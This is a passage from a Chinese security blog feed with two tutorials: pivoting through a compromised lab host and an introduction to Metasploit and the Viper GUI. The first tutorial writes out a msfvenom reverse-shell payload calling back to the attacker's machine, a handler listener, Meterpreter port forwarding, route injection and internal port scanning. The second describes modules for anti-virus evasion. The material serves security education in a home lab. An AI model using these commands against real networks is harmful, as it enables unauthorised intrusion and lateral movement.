src="\media\2023\02\内网穿透介绍学习9.webp" alt=""></p><p>成功</p><p>然后装一个xampp，或者小皮面板，个人建议小白用小皮面板</p><p>然后创建个网站就行</p><p>然后用 2016访问一下</p><p>![[13.png]]</p><h4 id="3-Kali-Linux"><a href="#3-Kali-Linux" class="headerlink" title="(3) Kali Linux"></a>(3) Kali Linux</h4><p>不用管它</p><p>ping一下 2016那块接外网的IP</p><p><img src="\media\2023\02\内网穿透介绍学习10.webp" alt=""></p><p>我们看看能不能ping通10.10.10.0网段</p><p><img src="\media\2023\02\内网穿透介绍学习12.webp" alt=""></p><p><img src="\media\2023\02\内网穿透介绍学习11.webp" alt=""></p><p>可以看到是ping不通的。</p><p>我们访问一下网站</p><p><img src="\media\2023\02\内网穿透介绍学习14.webp" alt=""></p><p>访问不了。</p><h2 id="三-端口转发"><a href="#三-端口转发" class="headerlink" title="三. 端口转发"></a>三. 端口转发</h2><p>这个就是根据命令在数据包完整的转给目标IP和目标端口</p><p>首先我们要知道这个网络结构是什么样的，哪个是代理机，哪个是目标机</p><p>现在我们是在kali上无法访问网站，我们现在想要通过win2016的外网IP来访问这个网站，即把win7的数据包通过2016全部转发给kali</p><h3 id="1-使用netsh进行端口转发"><a href="#1-使用netsh进行端口转发" class="headerlink" title="1. 使用netsh进行端口转发"></a>1. 使用netsh进行端口转发</h3><p>这个模拟的是：<strong>kali已经控制了win2016</strong></p><p>先在win7上启动服务，即做一个网站，然后测试2016能不能访问。这个我们已经完成了</p><p>然后在2016上通过netsh启用端口转发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=8080 connectaddress=10.10.10.129 connectport=80</span><br></pre></td></tr></table></figure><p>这句话的意思是：</p><p>使用netsh，启用一个代理端口，并且是IPv4 to IPv4之间的代理，监听端口为8080，要代理的地址是10.10.10.129，代理IP的端口是80。</p><p>监听端口win2016开启的端口，我们要通过这个端口访问2016</p><p>代理端口是win7开启的，能让2016访问的端口。</p><p>然后我们可以通过访问2016的8080端口来访问win7的80端口了。</p><p>输入命令</p><p><img src="\media\2023\02\内网穿透介绍学习15.webp" alt=""></p><p>我们来验证一下是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习16.webp" alt=""></p><p>然后我们就可以在kali上访问了，注意这个IP是外网的IP</p><p><img src="\media\2023\02\内网穿透介绍学习17.webp" alt=""></p><p>成功访问</p><p>清除转发规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=8080  // 删除指定的</span><br><span class="line">netsh interface portproxy reset  // 全删了</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习18.webp" alt=""></p><p>这样就没了。</p><h3 id="2-使用Meterpreter进行端口转发"><a href="#2-使用Meterpreter进行端口转发" class="headerlink" title="2. 使用Meterpreter进行端口转发"></a>2. 使用Meterpreter进行端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.71.129 LPORT=4444 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p>这个LHOST是kali的IP</p><p><img src="\media\2023\02\内网穿透介绍学习19.webp" alt=""></p><p>我们看一下这玩应在哪个目录</p><p><img src="\media\2023\02\内网穿透介绍学习20.webp" alt=""></p><p>在root里头</p><p><img src="\media\2023\02\内网穿透介绍学习21.webp" alt=""></p><p>找到了，然后我们需要打开监听模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.71.129  // 上面的lhost</span><br><span class="line">set lport 4444  // 上面的lport</span><br><span class="line">run  // 打开监听</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习22.webp" alt=""></p><p>最后就是把shell.exe复制到2016里头，运行。</p><p><img src="\media\2023\02\内网穿透介绍学习23.webp" alt=""></p><p>上线成功</p><p>我们可以看2016的一些东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习24.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习25.webp" alt=""></p><p>然后我们就可以来开启端口转发了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 8889 -r 10.10.10.129 -p 80</span><br></pre></td></tr></table></figure><p>添加本地端口号8889，远程IP地址为10.10.10.129，端口号为80</p><p>这个意思就是说，我们用2016这个肉鸡来访问10.10.10.129的80端口</p><p><img src="\media\2023\02\内网穿透介绍学习26.webp" alt=""></p><p>然后我们就可以在kail本地访问网站了。</p><p><img src="\media\2023\02\内网穿透介绍学习27.webp" alt=""></p><p>成功！</p><h3 id="3-win7远程桌面"><a href="#3-win7远程桌面" class="headerlink" title="3. win7远程桌面"></a>3. win7远程桌面</h3><p>我们先要确定win7打没打开3389端口，我这里是打开了</p><p><img src="\media\2023\02\内网穿透介绍学习34.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backgroud</span><br></pre></td></tr></table></figure><p>这个命令可以让当前MSF的工作放到后台。</p><p><img src="\media\2023\02\内网穿透介绍学习28.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions</span><br></pre></td></tr></table></figure><p>这个命令可以看到MSF所有的任务</p><p><img src="\media\2023\02\内网穿透介绍学习29-1.webp" alt=""></p><p>可以看到现在有一个任务</p><p>我们在当前任务下再开一个端口用来跑远程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1  // 选择ID为1的任务</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习30.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 8839 -r 10.10.10.129 -p 3389</span><br></pre></td></tr></table></figure><p>我们用8839端口来转win7的3389端口。</p><p><img src="\media\2023\02\内网穿透介绍学习31.webp" alt=""></p><p>成功，然后在kali命令行里整远程桌面就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:8839</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习32.webp" alt=""></p><p>成功远程访问</p><p><img src="\media\2023\02\内网穿透介绍学习33.webp" alt=""></p><h2 id="四-怎么找到内网IP信息"><a href="#四-怎么找到内网IP信息" class="headerlink" title="四. 怎么找到内网IP信息"></a>四. 怎么找到内网IP信息</h2><h3 id="1-得到内网IP"><a href="#1-得到内网IP" class="headerlink" title="1. 得到内网IP"></a>1. 得到内网IP</h3><p>我们现在是清空了所有的端口转发</p><p><img src="\media\2023\02\内网穿透介绍学习35.webp" alt=""></p><p>我们现在是已经在代理机中放入木马了。</p><p><img src="\media\2023\02\内网穿透介绍学习36.webp" alt=""></p><p>现在我们想要进行内网穿透，必须要先知道目标机在内网的IP地址是啥？</p><p>我们打开肉鸡的shell</p><p>我们可以看ARP缓存表，由于我们已经拿到代理机了，所以这里可以直接看到代理机的ARP缓存</p><p><img src="\media\2023\02\内网穿透介绍学习37.webp" alt=""></p><p>可以看到肉鸡的ARP表中有这些数据，访问过：</p><ul><li>10.10.10.129：一个主机IP</li><li>10.10.10.254：不用管</li><li>10.10.10.255：不用管</li><li>192.168.71.129：kali的IP不用管</li><li>192.168.71.254：不用管</li><li>192.168.71.255：不用管</li><li>剩下的都没用</li></ul><p>所以我们得到一个我们能的IP：10.10.10.129</p><p>我们还可以看一下路由表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习38.webp" alt=""></p><p>可以得到两个地址，192.168.17.128和10.10.10.128，能看出来这俩是代理机的IP。</p><p>以上是windows自带的命令，我们还可以执行一些meterpreter中的指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets </span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习39.webp" alt=""></p><p>这里可以获取肉鸡的子网。</p><h3 id="2-确认目标是否存活"><a href="#2-确认目标是否存活" class="headerlink" title="2. 确认目标是否存活"></a>2. 确认目标是否存活</h3><p>我们ping一下来确定目标是否存活</p><p>ping的话就不能在meterpreter中了，需要在肉鸡的shell里</p><p><img src="\media\2023\02\内网穿透介绍学习40.webp" alt=""></p><p>然后我的虚拟机出了点意外，重新弄了IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali : 192.168.40.129</span><br><span class="line">win 2016：10.10.10.128，192.168.40.128</span><br><span class="line">win7：10.10.10.129</span><br></pre></td></tr></table></figure><p>由于IP变动、，所以我们再在shell看一下ARP表</p><p><img src="\media\2023\02\内网穿透介绍学习41.webp" alt=""></p><p>还是10.10.10.129</p><p>我们在shell里ping一下</p><p><img src="\media\2023\02\内网穿透介绍学习42.webp" alt=""></p><p>可以ping通，说明129存活。</p><h3 id="3-确认目标开启的端口服务"><a href="#3-确认目标开启的端口服务" class="headerlink" title="3. 确认目标开启的端口服务"></a>3. 确认目标开启的端口服务</h3><p>我们有两个方案可以进行内网的扫描：</p><ul><li>MSF路由</li><li>MSF代理</li></ul><p>我们讲一下MSF路由</p><p>我们有三种方式来添加路由</p><h5 id="1、自动添加路由表"><a href="#1、自动添加路由表" class="headerlink" title="1、自动添加路由表"></a>1、自动添加路由表</h5><ul><li>在MSF中直接运行：<code>run autoroute -s 192.168.40.0/24</code>，添加一条<code>192.168.40.0/24</code>的路由</li></ul><p><img src="\media\2023\02\内网穿透介绍学习43.webp" alt=""></p><p>这里告诉我们，这个玩应不建议使用，但是能用，这个用法已经过期，然后让我们运行后面那个post渗透模块。然后给了你一个例子。</p><p>然后提示你路由增加成功。</p><p>我们看一下路由表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习44.webp" alt=""></p><p>可以看到，这就有一个路由了。</p><p>我们也可以使用刚才建议的用法。</p><p>我们先把路由删了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -d -s 192.168.40.0/24</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习45.webp" alt=""></p><p>路由条目删除了。</p><h5 id="2、使用模块"><a href="#2、使用模块" class="headerlink" title="2、使用模块"></a>2、使用模块</h5><p>我们用刚才提示的新方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习46.webp" alt=""></p><p>我们看一下</p><p><img src="\media\2023\02\内网穿透介绍学习47.webp" alt=""></p><p>这个方法是根据木马所在的肉鸡的网段自动生成路由</p><h5 id="3、收手动添加路由表"><a href="#3、收手动添加路由表" class="headerlink" title="3、收手动添加路由表"></a>3、收手动添加路由表</h5><p>这个和第一种差不多，我们先把路由表删了在运行。</p><p>然后background切换到后台，<strong>注意，不是退出，是切到后台运行</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add 192.168.40.0/24 1  // 1代表session1</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习48.webp" alt=""></p><p>添加成功。</p><p>然后我们可以切回去再看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session -i 1</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\内网穿透介绍学习49.webp" alt=""></p><h5 id="4、开始端口扫描"><a href="#4、开始端口扫描" class="headerlink" title="4、开始端口扫描"></a>4、开始端口扫描</h5><p>在MSF中输入：<code>use auxiliary/scanner/portscan/tcp</code>进入tcp模块进行端口扫描</p><p><img src="\media\2023\02\内网穿透介绍学习50.webp" alt=""></p><p>然后我们可以用 <code>show options</code>进行查看命令。</p><p>我们扫一下端口，直接扫1-10000。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set posts 1-10000</span><br></pre></td></tr></table></figure><p>然后设置主机，就是肉鸡的IP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.40.128</span><br></pre></td></tr></table></figure><p>设置一个线程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set threads 5</span><br></pre></td></tr></table></figure><p>然后 <code>run</code>开始跑</p><p><img src="\media\2023\02\内网穿透介绍学习51.webp" alt=""></p><p>扫描的端口有点多，时间会有点长。</p><p>我这里列出了一些模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/ftp_version               #发现内网ftp服务，基于默认21端口</span><br><span class="line">auxiliary/scanner/ssh/ssh_version               #发现内网ssh服务，基于默认22端口</span><br><span class="line">auxiliary/scanner/tenet/telnet_version          #发现内网telnet服务，基于默认23端口</span><br><span class="line">auxiliary/scanner/dns/dns_amp                   #发现dns服务，基于默认53端口</span><br><span class="line">auxiliary/scanner/http/http_version             #发现内网http服务，基于默认80端口</span><br><span class="line">auxiliary/scanner/http/title                    #探测内网http服务的标题</span><br><span class="line">auxiliary/scanner/smb/smb_version               #发现内网smb服务，基于认的445端口</span><br><span class="line">use auxiliary/scanner/msql/mssql_schemadump     #发现内网SQLServer服务,基于默认的1433端口</span><br><span class="line">use auxiliary/scanner/oracle/oracle_hashdump    #发现内网oracle服务,基于默认的1521端口</span><br><span class="line">auxiliary/scanner/mysql/mysql_version           #发现内网mysql服务，基于默认3306端口</span><br><span class="line">auxiliary/scanner/rdp/rdp_scanner               #发现内网RDP服务，基于默认3389端口</span><br><span class="line">auxiliary/scanner/redis/redis_server            #发现内网Redis服务，基于默认6379端口</span><br><span class="line">auxiliary/scanner/db2/db2_version               #探测内网的db2服务，基于默认的50000端口</span><br><span class="line">auxiliary/scanner/netbios/nbname                #探测内网主机的netbios名字</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF渗透测试框架介绍</title>
      <link href="/2023/02/16/9/"/>
      <url>/2023/02/16/9/</url>
      
        <content type="html"><![CDATA[<h2 id="一-MSF"><a href="#一-MSF" class="headerlink" title="一. MSF"></a>一. MSF</h2><h3 id="1-MSF介绍"><a href="#1-MSF介绍" class="headerlink" title="1. MSF介绍"></a>1. MSF介绍</h3><p>MSF全称Metasploit，是一款开源安全漏洞检测工具，附带数百个已知的软件漏洞，并保持频繁更新。被安全社区冠以 “可以黑掉整个宇宙” 之名的强<br>大渗透测试框架。</p><p>Metasploit是一款开源的渗诱测过框架平台，到目前为止，msf已经内置了数千个已披露的漏洞相关的模块和渗透测试工具。</p><p>模块使用ruby语言编写，这使得使用者能够根据需要对模块进行适当修改，甚至是调用自己写的测试模块。</p><p>选定需要使用的攻击模块之后，你只需要使用简单的命令配置一些参数就能完成针对一个漏洞的测试和利用，将渗透的过程自动化、简单化。</p><h4 id="MSF安装使用"><a href="#MSF安装使用" class="headerlink" title="MSF安装使用"></a>MSF安装使用</h4><p>MSF在kail中已经内置好了，直接在kail命令行中输入<code>msfconsole</code>就可以使用了。</p><p><img src="\media\2023\02\MSF渗透测试框架介绍1.webp" alt=""></p><h4 id="MSF在kali中的更新"><a href="#MSF在kali中的更新" class="headerlink" title="MSF在kali中的更新"></a>MSF在kali中的更新</h4><p>配置源，kali的更新，kali软件包的更新等等，这里就不多介绍了。</p><p>我们在命令行输入这个命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\MSF渗透测试框架介绍2.webp" alt=""></p><p>问我们是否继续执行，输入 ‘y’</p><p><img src="\media\2023\02\MSF渗透测试框架介绍3.webp" alt=""></p><p>开始进行安装了。等待完成即可。</p><h3 id="2-MSF图形化"><a href="#2-MSF图形化" class="headerlink" title="2. MSF图形化"></a>2. MSF图形化</h3><p>Viper是一款图形化内网渗透工具,将内网渗透过程中常用的战术及技术进行模块化及武器化</p><p>集成杀软绕过内网隧道,文件管理,命令行等基础功能</p><p>当前已集成70+个模块覆盖初始访问/持久化/权限提升/防御绕过/凭证访问/信息收集/横向移动等大类</p><h4 id="在Kali上通过Docker安装Viper-炫彩蛇"><a href="#在Kali上通过Docker安装Viper-炫彩蛇" class="headerlink" title="在Kali上通过Docker安装Viper(炫彩蛇)"></a>在Kali上通过Docker安装Viper(炫彩蛇)</h4><h5 id="1、安装docker"><a href="#1、安装docker" class="headerlink" title="1、安装docker"></a>1、安装docker</h5><p>我们先update一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p>等待更新完毕，更新好了之后我们就可以开始拉docker了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker.io</span><br></pre></td></tr></table></figure><p>然后等待安装完成后，我们查询一下docker的状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\MSF渗透测试框架介绍4.webp" alt=""></p><p>我们再设置一下docker的开机自启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h5 id="2、安装docker-compose"><a href="#2、安装docker-compose" class="headerlink" title="2、安装docker-compose"></a>2、安装docker-compose</h5><p>我们输入这个命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m`  &gt; /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\MSF渗透测试框架介绍5.webp" alt=""></p><p>这里就拉了一个脚本，我们再输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>然后设定一个安装目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export VIPER_DIR=/root/VIPER</span><br></pre></td></tr></table></figure><p>然后我们生成一个安装目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $VIPER_DIR &amp;&amp; cd $VIPER_DIR</span><br></pre></td></tr></table></figure><p>然后我们输入这些代码，生成一个.yml文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tee docker-compose.yml &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">version: &quot;3&quot;</span><br><span class="line">services:</span><br><span class="line">  viper:</span><br><span class="line">    image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest</span><br><span class="line">    container_name: viper-c</span><br><span class="line">    network_mode: &quot;host&quot;</span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">      - $&#123;PWD&#125;/loot:/root/.msf4/loot</span><br><span class="line">      - $&#123;PWD&#125;/db:/root/viper/Docker/db</span><br><span class="line">      - $&#123;PWD&#125;/module:/root/viper/Docker/module</span><br><span class="line">      - $&#123;PWD&#125;/log:/root/viper/Docker/log</span><br><span class="line">      - $&#123;PWD&#125;/nginxconfig:/root/viper/Docker/nginxconfig</span><br><span class="line">    command: [&quot;VIPER_PASSWORD&quot;]</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>注意一定要一摸一样，空格，冒号，缩进，符号，不能差了。</p><p>然后我们设置一个登录密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export VIPER_PASSWORD=root（你自己的密码）</span><br></pre></td></tr></table></figure><p>然后我们将密码写到yml文件里头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s/VIPER_PASSWORD/$VIPER_PASSWORD/g&quot; docker-compose.yml</span><br></pre></td></tr></table></figure><p>我们来检查一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat docker-compose.yml</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\MSF渗透测试框架介绍6.webp" alt=""></p><p>可以看到root已经写进去了</p><h5 id="3、创建启动VIPER"><a href="#3、创建启动VIPER" class="headerlink" title="3、创建启动VIPER"></a>3、创建启动VIPER</h5><p>进到viper的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd $VIPER_DIR  </span><br></pre></td></tr></table></figure><p>创建启动docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\MSF渗透测试框架介绍7.webp" alt=""></p><p>viper安装完成</p><p>然后我们在浏览器中访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://你的IP:60000</span><br></pre></td></tr></table></figure><p>比如我的就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.40.129:60000</span><br></pre></td></tr></table></figure><p><img src="\media\2023\02\MSF渗透测试框架介绍8.webp" alt=""></p><p>输入账号密码，按照刚才设置的话，账号密码都是root。</p><p><img src="\media\2023\02\MSF渗透测试框架介绍9.webp" alt=""></p><p>成功进入。</p><h2 id="二-MSF的目录结构"><a href="#二-MSF的目录结构" class="headerlink" title="二. MSF的目录结构"></a>二. MSF的目录结构</h2><h3 id="1-主目录"><a href="#1-主目录" class="headerlink" title="1. 主目录"></a>1. 主目录</h3><p>我们在终端中进入这个目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework</span><br></pre></td></tr></table></figure><p>输入 ‘ls’</p><p><img src="\media\2023\02\MSF渗透测试框架介绍10.webp" alt=""></p><p>这里就是MSF的一些文件夹</p><p><img src="\media\2023\02\MSF渗透测试框架2.webp" alt=""></p><p>这其中包括了config配置文件、plugins插件、tools工具、db数据库文件、modules模块文件以及msfconsole、msfdb等命令。</p><p>modules中的文件为我们最常用的模块文件，其中每个模块中都根据不同的操作系统，分为不同平台不同协议功能对应的漏洞利用文件，这些文件用ruby编写。</p><p>以下是文件的介绍</p><!-- wp:table --><p><figure class="wp-block-table"><table><tbody><tr><td>文件名</td><td>功能</td></tr><tr><td>config</td><td>metasploit的环境配置信息，数据库配置信息</td></tr><tr><td>data</td><td>后渗透模块的一些工具及payload，第三方小工具集合，用户字典等数据信息</td></tr><tr><td>db</td><td>rails编译生成msf的web框架时的数据库信息</td></tr><tr><td>documentation</td><td>用户说明文档及开发文档</td></tr><tr><td><s>external</s></td><td><s>metasploit的一些基础扩展模块</s></td></tr><tr><td>lib</td><td>metasploit的一些基础类和第三方模块类</td></tr><tr><td>log</td><td>msf运行时的一些系统信息和其他信息</td></tr><tr><td>modules</td><td>metasploit的系统工具模块，包括顶辅助模块（auxiliary），渗透模块（exploits）攻击荷载（pavloads）和后渗透模块</td></tr><tr><td><s>msfbinscan</s></td><td><s>对bin文件进行文件偏移地址扫描</s></td></tr><tr><td><s>msfcli</s></td><td><s>metasploit命令行模式，可以快速调用有效的payload进行攻击，2015年6月18日已弃用，了解一下</s></td></tr><tr><td>msfconsole</td><td>metasploit的基本命令行，集成了各种功能。</td></tr><tr><td>msfd</td><td>metasploit服务，非持久性服务</td></tr><tr><td><s>msfelfscan</s></td><td><s>对linux的elf文件偏移地址进行扫描</s></td></tr><tr><td><s>msfencode</s></td><td><s>metasploit的编码模块，可以对mepayload和shellcode进行编码输出，已被msfvenmon替代。</s></td></tr><tr><td><s>msfpayload</s></td><td><s>metasploit攻击荷载，用以调用不同的攻击荷载，生成和输出不同格式的shellcode，已被msfvenmon替代。</s></td></tr><tr><td><s>msfmachscan</s></td><td><s>功能同msfelfscan</s></td></tr><tr><td><s>msfpescan</s></td><td><s>对windows的pe格式文件偏移地址进行扫描</s></td></tr><tr><td><s>msfrop</s></td><td><s>对windows的pe进行文件地址偏移操作，可以绕过alsr等</s></td></tr><tr><td>msfrpc</td><td>metasploit的服务端，非持久性的rpc服务</td></tr><tr><td>msfrpcd</td><td>持久性的metasploit本地服务，可以给远程用户提供rpc服务以及其他的http服务，可以通过xml进行数据传输。</td></tr><tr><td>msfupdate</td><td>metasploit更新模块，可以用来更新metasploit模块</td></tr><tr><td>msfvenom</td><td>集成了msfpayload和msfencode的功能，效率更高，替代msfpayload和msfencode</td></tr><tr><td>plugins</td><td>metasploit的第三方插件接口</td></tr><tr><td>scripts</td><td>metasplit的常用后渗透模块，区别于data里的后渗透模块，不需要加post参数和绝对路径，可以直接运行</td></tr><tr><td><s>test</s></td><td><s>metasploit的基本测试目录</s></td></tr><tr><td>tools</td><td>额外的小工具和第三方脚本工具</td></tr></tbody></table></figure><br><!-- /wp:table --></p><h3 id="2-模块"><a href="#2-模块" class="headerlink" title="2. 模块"></a>2. 模块</h3><p>我们看看modules文件夹</p><p>所在位置: /usr/share/metasploit-framework/modules</p><p><img src="\media\2023\02\MSF渗透测试框架1.webp" alt=""></p><!-- wp:table --><p><figure class="wp-block-table"><table><tbody><tr><td>模块名</td><td>中文解释</td><td>功能描述</td></tr><tr><td>Auxiliaries</td><td>辅助模块</td><td>该模块不会直接在测试者和目标主机之间建立访问，<br>它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试</td></tr><tr><td>Exploit</td><td>漏洞利用模块</td><td>漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。流行的渗透测试攻击技术包括缓冲区溢出、Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码每个漏洞都有相应的攻击代码。</td></tr><tr><td>Payload</td><td>攻击载荷模块</td><td>攻击载荷是我们期望目标系统在被渗透攻击之后完成实际供给功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由选择、传送和植入。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等</td></tr><tr><td>Post</td><td>后期渗透模块</td><td>该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等</td></tr><tr><td>Encoders</td><td>编码工具模块</td><td>该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、IDS及类似的安全软件检测出来</td></tr><tr><td>evasion</td><td>混淆模块</td><td>能够生成绕过杀毒软件的shell 